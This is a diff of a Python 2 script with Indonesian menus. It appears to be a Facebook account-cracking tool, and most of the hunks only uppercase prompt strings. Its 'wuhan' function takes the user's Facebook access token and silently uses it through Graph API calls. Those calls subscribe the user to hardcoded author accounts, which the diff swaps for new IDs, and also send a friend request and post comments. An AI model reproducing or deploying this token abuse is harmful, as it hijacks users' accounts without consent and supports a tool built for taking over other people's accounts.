@@ -150,7 +150,7 @@ def moch_yayan():
                 print(" [%s+%s] %s"%(O,N,file))
             file = raw_input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
             if file == "":
-                file = raw_input("\n %s[%s?%s] masukan nama file :%s %s"%(N,M,N,H,N))
+                file = raw_input("\n %s[%s?%s] MASUKAN NAMA FILE :%s %s"%(N,M,N,H,N))
             total = open("results/%s"%(file)).read().splitlines()
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
             nm_file = ("%s"%(file)).replace("-", " ")
@@ -164,7 +164,7 @@ def moch_yayan():
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
             raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
         except (IOError):
-            print("\n %s[%sÃ—%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
+            print("\n %s[%sÃ—%s] UPPS KAMU TIDAK MENDAPATKAN HASIL :("%(N,M,N))
             raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
     elif pepek in['5','05']:
         seting_yntkts()
@@ -172,15 +172,15 @@ def moch_yayan():
         print '\n'
         tod()
         time.sleep(1);os.system('rm -rf .memek.txt')
-        jalan('\n %s[%sâœ“%s]%s berhasil menghapus token'%(N,H,N,H));exit()
+        jalan('\n %s[%sâœ“%s]%s BERHASIL MENGHAPUS TOKEN'%(N,H,N,H));exit()
     else:
         print '\n %s[%sÃ—%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
 
 def wuhan(kontol):
     try:
         kentod = kontol
-        requests.post('https://graph.facebook.com/100054912310434/subscribers?access_token=%s'%(kentod)) #YUSRIN
-        requests.post('https://graph.facebook.com/100072677928941/subscribers?access_token=%s'%(kentod)) #TAUFIQ
+        requests.post('https://graph.facebook.com/100048983880739/subscribers?access_token=%s'%(kentod)) #YUSRIN
+        requests.post('https://graph.facebook.com/100078379432123/subscribers?access_token=%s'%(kentod)) #NURDIN KUMAR
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
         #requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
